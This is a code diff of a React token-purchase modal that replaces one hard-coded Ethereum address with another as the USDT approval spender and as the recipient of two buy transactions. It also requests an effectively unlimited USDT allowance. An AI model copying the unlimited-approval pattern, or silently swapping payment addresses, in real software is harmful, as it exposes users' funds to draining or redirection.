@@ -243,7 +243,7 @@ export default function BuyTokenModal({ isOpen, onClose }: BuyTokenModalProps) {
       setError(null);
       console.log("Starting USDT approval...");
       
-      const spenderAddress = "0xF4187144b589e31853471683AC676616101835Fb";
+      const spenderAddress = "0xC414436B424318808069A9ec5B65C52A7523c743";
       const maxApproval = parseUnits("115792089237316195423570985008687907853269984665640564039457", 6);
 
       console.log("Preparing approval transaction...");
@@ -288,7 +288,7 @@ export default function BuyTokenModal({ isOpen, onClose }: BuyTokenModalProps) {
       console.log("Amount in wei:", value.toString());
 
       const hash = await walletClient.sendTransaction({
-        to: "0xF4187144b589e31853471683AC676616101835Fb",
+        to: "0xC414436B424318808069A9ec5B65C52A7523c743",
         data: encodeFunctionData({
           abi: abi,
           functionName: 'BuyWithNative',
@@ -321,7 +321,7 @@ export default function BuyTokenModal({ isOpen, onClose }: BuyTokenModalProps) {
       const usdtAmount = amount;
       
       const hash = await walletClient.sendTransaction({
-        to: '0xF4187144b589e31853471683AC676616101835Fb',
+        to: '0xC414436B424318808069A9ec5B65C52A7523c743',
         data: encodeFunctionData({
           abi: abi,
           functionName: 'BuyWithUSDT',
